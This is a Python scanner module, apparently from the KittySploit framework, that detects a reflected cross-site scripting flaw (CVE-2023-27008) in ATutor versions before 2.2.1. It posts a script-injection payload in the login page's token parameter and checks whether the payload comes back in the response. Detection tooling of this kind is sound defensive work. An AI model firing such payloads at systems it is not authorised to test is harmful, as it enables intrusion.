#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ATutor < 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ATutor < 2.2.1 - Cross Site Scripting Detection',
        'description': 'ATutor < 2.2.1 was discovered with a vulnerability, a reflected cross-site scripting (XSS), in ATtutor 2.2.1 via token body parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xss', 'atutor', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-27008',
            'https://plantplants213607121.wordpress.com/2023/02/16/atutor-2-2-1-cross-site-scripting-via-the-token-body-parameter/',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2023-27008',
    }

    def run(self):
        path = '/atutor/login.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='token=asdf");}alert(document.domain);+function+asdf()+{//\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = (');}alert(document.domain); function', 'ATutor')
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='ATutor < 2.2.1 - Cross Site Scripting detected', path=path)
            return True
        return False

